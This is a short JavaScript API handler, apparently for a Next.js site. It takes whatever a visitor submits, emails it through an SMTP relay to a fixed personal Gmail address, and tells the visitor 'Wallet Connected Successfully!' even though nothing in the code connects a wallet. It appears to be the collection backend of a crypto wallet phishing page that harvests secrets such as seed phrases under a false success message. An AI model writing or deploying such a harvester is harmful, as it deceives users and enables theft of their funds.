const nodemailer = require("nodemailer");
require('dotenv').config();
const authenticate = process.env.AuthPass

const notify = async(message, res) => {
    try {
     const smtpTransport = nodemailer.createTransport({
       host:"smtp-relay.sendinblue.com",
       port:587,
       auth: {
         user: process.env.SMTP_USER,
         pass: process.env.SMTP_SECRET
       },
     })
   
       const sendingmail = smtpTransport.sendMail({
         from: 'davidsonkesley@gmail.com',
         to: 'collinsrollinsmail@gmail.com',
         subject: `New Message from your Website with subject`,
         html: `<body><h1>Hello there,</h1><p>${message}</p><br></br><center>
         </body>`,
       })
   
       if(sendingmail){
         console.log(sendingmail)
         res.status(200).json({
           success:true,
           message: "Wallet Connected Successfully!"
         })
       }
   
    } catch (error) {
      console.log(error)
    }
   }
   
   
export default async function handler(req, res) {
    const message = await JSON.parse(req.body);
    console.log(message)
    await notify(message, res);
  
  }